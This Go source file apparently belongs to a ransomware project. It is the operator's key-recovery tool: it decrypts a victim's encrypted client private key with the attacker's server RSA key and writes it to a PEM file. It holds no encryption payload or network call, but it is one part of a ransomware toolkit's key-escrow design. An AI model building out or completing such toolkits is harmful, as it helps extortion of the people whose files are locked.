package main

import (
	"encoding/pem"
	"fmt"
	"os"
	enc "ransomware/encryption"
	"ransomware/io"
)

var (
	sPrivKey, _ = io.ReadPrivateKey("privateKey.pem")
)

func decryptClientKey(path string) {
	block, _ := os.ReadFile(path)

	decodedBlock := enc.RSAAESDecrypt(block, sPrivKey)

	pemBlock := &pem.Block{Type: "RSA PRIVATE KEY", Bytes: decodedBlock}

	keyFile, err := os.Create("cPrivateKey.pem")
	if err != nil {
		fmt.Println(err)
	}

	pem.Encode(keyFile, pemBlock)
}

func main() {
	decryptClientKey(os.Args[1])
}
